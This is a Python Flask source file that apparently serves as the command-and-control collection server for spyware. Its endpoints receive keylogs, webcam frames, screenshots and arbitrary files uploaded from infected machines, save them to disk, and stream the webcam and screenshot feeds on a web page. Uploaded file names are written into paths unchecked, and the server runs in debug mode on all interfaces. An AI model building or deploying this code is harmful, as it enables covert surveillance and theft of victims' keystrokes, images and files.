from flask import Flask, request, Response, render_template_string
import threading
import time
from cryptography.fernet import Fernet
import datetime


app = Flask(__name__)
frame_lock = threading.Lock()

#Global variables
CURRENT_FRAME = None
KEYLOG = None
SCREENSHOT = None
FILE = None


# Load the key
# with open('secret.key', 'rb') as key_file:
#     key = key_file.read()
# fernet = Fernet(key)

@app.route('/api/keylog', methods=['POST'])
def keylog():
    global KEYLOG
    KEYLOG = request.form['log']
    current_time = datetime.datetime.now()
    name = "keylog-" + str(current_time) + ".txt"
    #save file
    try:
        with open('./server/logs/' + name, 'w') as f:
            f.write(KEYLOG)
    except:
        print("Error saving log")
        return 'Internal server error', 500
    return 'Keylog received', 200

@app.route('/api/webcam', methods=['POST'])
def upload():
    global CURRENT_FRAME
    file = request.files['file']
    CURRENT_FRAME = file.read()
    return 'Frame received', 200

@app.route('/api/screenshot', methods=['POST'])
def screenshot():
    global SCREENSHOT
    file = request.files['file']
    SCREENSHOT = file.read()
    name = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S") + "-" + file.filename
    #save file
    try:
        with open('./server/images/' + name, 'wb') as f:
            f.write(SCREENSHOT)
    except:
        print("Error saving image")
        return 'Internal server error', 500
    return 'Screenshot received', 200

@app.route('/api/files', methods=['POST'])
def files():
    global FILE
    if 'file' not in request.files:
        return 'No file uploaded', 400
    file = request.files['file']
    if file.filename == '':
        return 'No file uploaded', 400
    if file:
        FILE = file.read()
        name = file.filename + "-"+ datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        #save file
        try:
            with open('./server/files/' + name, 'wb') as f:
                f.write(FILE)
        except:
            print("Error saving file")
            return 'Internal server error', 500
        return 'File received', 200
    return 'No file uploaded', 400


def gen_frames():
    while True:
        with frame_lock:
            if CURRENT_FRAME is not None:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + CURRENT_FRAME + b'\r\n')
        time.sleep(0.1)  # Adjust the sleep time as needed

@app.route('/video_feed')
def video_feed():
    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/screenshot_feed')
def screenshot_feed():
    return Response(SCREENSHOT, mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <head>
    <title>Webcam Stream</title>
    </head>
    <body>
    <h1>Webcam Stream</h1>
    <img src="/video_feed">
    <h1>Screenshot</h1>
    <img src="/screenshot_feed">
    </body>
    </html>
    """)

if __name__ == '__main__':
    #crete the directories
    import os
    if not os.path.exists('./server/logs'):
        os.makedirs('./server/logs')
    if not os.path.exists('./server/images'):
        os.makedirs('./server/images')
    if not os.path.exists('./server/files'):
        os.makedirs('./server/files')
        
    app.run(host='0.0.0.0', port=8081, debug=True, threaded=True)

